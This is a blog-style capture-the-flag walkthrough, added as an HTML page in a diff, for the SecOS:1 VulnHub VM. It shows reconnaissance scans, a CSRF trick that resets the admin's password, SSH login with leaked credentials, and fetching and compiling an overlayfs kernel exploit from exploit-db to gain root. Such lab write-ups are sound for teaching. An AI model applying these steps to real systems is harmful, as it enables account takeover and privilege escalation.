@@ -1,0 +1,84 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the SecOS:1 (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-secos1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-08-07T08:10:29+00:00">August 7, 2016</time><time class="updated" datetime="2025-06-10T20:30:45+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello readers and welcome to another CTF challenge. It is developed by PaulWebSec. The aim of this lab is to get the root on the VM and read the congratulatory message. The virtual machine can be downloaded <a style="color: #000000;" href="https://www.vulnhub.com/entry/secos-1,88/">here</a>. I quickly loaded up the machine and it was primed and ready!</span></p>
+<h3><span style="color: #800000;">Steps involved:</span></h3>
+<ul>
+<li><span style="color: #000000;">IP discovery and port scanning</span></li>
+<li><span style="color: #000000;">Running the web app</span></li>
+<li><span style="color: #000000;">Running a CSRF attack on the administrator</span></li>
+<li><span style="color: #000000;">Tricking admin to visit a fake page by sending him a message</span></li>
+<li><span style="color: #000000;">Waiting a few minutes to let admin visit that page</span></li>
+<li><span style="color: #000000;">Getting credentials and logging in SSH using these</span></li>
+<li><span style="color: #000000;">Running overlayfs on the system</span></li>
+<li><span style="color: #000000;">Getting root access!</span></li>
+</ul>
+<p><span style="color: #000000;">So, let’s start.</span></p>
+<p><span style="color: #000000;">I need not say this after so many articles but the first and foremost step is running <strong>netdiscover </strong>to find the IP address of the VM.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Rm4CDh5sGbU/W2lKtdT0JEI/AAAAAAAAZb0/_VPgLJ8YffY7GTLuQQ2-CzPPN31SWn3-gCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">The IP address in my case was <strong>192.168.1.128</strong></span></p>
+<p><span style="color: #000000;">I run an aggressive nmap scan on this IP address to find which ports were open and the first clue to start the attack on.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.128</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eugosw7JZvc/W2lKusnXWZI/AAAAAAAAZcE/1fgdF1aCBk47ooiG2CSzPgv9Ahn8jRhewCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">We found a web app working on port 8081. Without any delay, we opened it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eugosw7JZvc/W2lKusnXWZI/AAAAAAAAZcE/1fgdF1aCBk47ooiG2CSzPgv9Ahn8jRhewCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">We found a web app working on port 8081. Without any delay, we opened it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HGLHxGjahmw/W2lKvAty8zI/AAAAAAAAZcI/9BlFn5gUREgbZvJlTvJAf-ch7AuC1oPjQCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">The first hint was the message shown—“Secure Web App is a part of the vulnerable VM called secOS-2”</span></p>
+<p><span style="color: #000000;">Hence, we inferred that this VM has web-based vulnerabilities. Next step was to run a Nikto scan which didn’t yield much info either.</span></p>
+<p><span style="color: #000000;">So, we ran <strong>dirb </strong>in hope that we find something good here.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.128:8081</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4yYDkJyn0l0/W2lKv1z-NnI/AAAAAAAAZcU/vNkCQZtMRjIngYSbvMBRXQMPHIplUnBFgCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Of course, there is a login page! And a login page in a web vulnerable app means a route to shell!</span></p>
+<p><span style="color: #000000;">We moved forward to the login page directly.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-PLfPqhHa8Cs/W2lKvgsmVII/AAAAAAAAZcQ/eB78RYAm-jMSv0RNhxYPb-sFoQqumZ6IACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Although on inspecting the page, there were no satisfactory results there was still a register user page available to us. We headed over there.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SoWBsu9h1kI/W2lKwTi6NpI/AAAAAAAAZcY/uxP3NAvwnCgY1xOHtX_uvYIw3sKcn2lNgCLcBGAs/s1600/6.1.png"/></span></p>
+<p><span style="color: #000000;">Since we got redirected to the home page, it was fair to assume we got registered. Let’s try and login into the web app using that test user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0p-UC3qMRhI/W2lKwj059eI/AAAAAAAAZcc/g7rOl9VnSFwSwOgbrfp1QK4RfkAjz5JOACLcBGAs/s1600/6.3.png"/></span></p>
+<p><span style="color: #000000;">There wasn’t much information on the page except for the fact we saw a “My Messages” tab on the homepage.</span></p>
+<p><span style="color: #000000;">Although, it is worthy to note that <strong>Burp Spider </strong>showed us a page called “hint” and upon inspecting that page we found the following details:</span></p>
+<p><span style="color: #000000;"><strong>First: </strong>The admin visits the site very frequently.</span></p>
+<p><span style="color: #000000;"><strong>Second: </strong>He runs it locally on 127.0.0.1</span></p>
+<p><span style="color: #000000;"><strong>Third: </strong>CSRF is applicable!</span></p>
+<p><span style="color: #000000;">After some going around, we found under the “users” tab that Spiderman was the administrator. Could it be possible that we prompt the admin to change its password to our custom pass?</span></p>
+<p><span style="color: #000000;">Hence, we wrote a quick HTML CSRF in a text file and saved as <strong>csrf.html</strong> inside /var/www/html.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GJYxtSHMN_A/W2lKxKG1M1I/AAAAAAAAZck/vNzublfalzoOIJon6tXJaTPLKjPj9NIVwCLcBGAs/s1600/7.1.png"/></span></p>
+<p><span style="color: #000000;">What this does is that it will prompt the administrator user to change its password to “passw0rd”</span></p>
+<p><span style="color: #000000;">We saved the page to /var/www/html directory, started apache, ran the HTML code and waited for 2-3 minutes and we got logged into administrator account!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Qg8eRLzNVxg/W2lTTUYmEZI/AAAAAAAAZdM/KrEk4lIcx5U3c_2QBveTJuiRVP9voruFwCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">We found 2 messages from the pirate user. One had a password for unidentified service. Could it be possible that this is a password for SSH?</span></p>
+<p><span style="color: #000000;">We tried it out!</span></p>
+<pre class="lang:default decode:true">ssh spiderman@192.168.1.136</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fxiyIP5DAkw/W2lKsz6avsI/AAAAAAAAZbs/u5jZ3Ev4qOkkv7LGd3tRcP3R0asnnL5nQCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">It worked!!</span></p>
+<p><span style="color: #000000;">Next up, we looked for the Kernel version of the machine.</span></p>
+<pre class="lang:default decode:true">uname -a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-QkL12yjks6Y/W2lTYxTYoTI/AAAAAAAAZdU/ncPjkUKo7YQqT9rZ2V_q8lVQtc91ov2vACLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">After a couple of minutes of searching for exploits for the given kernel version, we found something worth to our cause.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J-0fupT_vhg/W2lTY7XK6UI/AAAAAAAAZdY/LuDkTV9Hv2YeIzGLK9deXk-tXeIj7LcggCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">It is exploitable with an exploit called “overlayfs.”</span></p>
+<p><span style="color: #000000;">We downloaded it and ran it.</span></p>
+<pre class="lang:default decode:true">cd /tmp
+wget https://www.exploit-db.com/download/37292.c
+gcc –o exploit 37292.c</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-j5l5pRReRmc/W2lTZQpv-yI/AAAAAAAAZdc/DGlUa0HZeiQq64CB2WfGRPdXVez8OurQgCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">After it got compiled using gcc, we ran it using:</span></p>
+<pre class="lang:default decode:true">./exploit
+whoami</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-15RgW9KyyGw/W2lTZUcc-9I/AAAAAAAAZdg/HbRd7OTA0OYSj6Q5qnZFUWnU-iEY6cryQCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Voila! It gave us a root shell.</span></p>
+<pre class="lang:default decode:true ">cd /root
+ls
+cat flag.txt</pre>
+<p><span style="color: #000000;">And just like that, it was over. Hope you enjoyed.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GSeS_zWlSBo/W2lTZkNXiLI/AAAAAAAAZdk/AfLjXqTYauY7z3kMMNn-yaBTs5XGP5mMwCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
